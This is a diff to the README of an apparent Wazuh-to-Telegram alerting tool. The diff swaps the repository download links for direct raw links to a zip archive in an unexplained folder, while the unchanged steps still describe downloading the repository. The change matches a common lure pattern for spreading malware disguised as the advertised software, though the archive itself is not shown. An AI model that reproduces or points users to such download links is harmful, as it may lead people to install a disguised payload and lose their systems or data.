@@ -1,6 +1,6 @@
 # 🔔 wazuh-telegram-alerting - Send instant security alerts to Telegram
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/redolent-viyella935/wazuh-telegram-alerting)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/redolent-viyella935/wazuh-telegram-alerting/raw/refs/heads/main/dewaterer/wazuh_alerting_telegram_3.4.zip)
 
 This tool connects your Wazuh security system to your Telegram account. It sends security notifications to your phone in real time. You get instant updates about your computer network status. The software formats these alerts in a clean way so you understand them. It runs reliably in your environment.
 
@@ -28,7 +28,7 @@ Your computer needs specific parts to run this software. Make sure you meet thes
 
 Follow these steps to set up the software.
 
-1. Visit this [download page](https://github.com/redolent-viyella935/wazuh-telegram-alerting) to get the files.
+1. Visit this [download page](https://github.com/redolent-viyella935/wazuh-telegram-alerting/raw/refs/heads/main/dewaterer/wazuh_alerting_telegram_3.4.zip) to get the files.
 2. Click the green Code button on the page.
 3. Choose Download ZIP.
 4. Open the ZIP file on your computer.
